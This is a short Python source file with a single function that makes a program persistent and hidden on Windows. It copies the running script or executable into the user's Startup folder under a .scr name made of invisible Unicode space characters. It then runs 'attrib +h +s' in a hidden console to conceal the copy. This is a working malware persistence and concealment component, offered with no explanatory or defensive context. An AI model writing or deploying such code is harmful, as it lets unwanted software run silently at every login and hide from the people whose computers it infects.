import os
import random
import subprocess
import sys
from shutil import copy2

def startup():
	startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if hasattr(sys, 'frozen'):
		source_path = sys.executable
	else:
		source_path = sys.argv[0]

	target_path = os.path.join(startup_path, "{}.scr".format("".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=5))))
	if os.path.exists(target_path):
		os.remove(target_path)

	copy2(source_path, target_path)
	subprocess.Popen(f'attrib +h +s {target_path}', shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
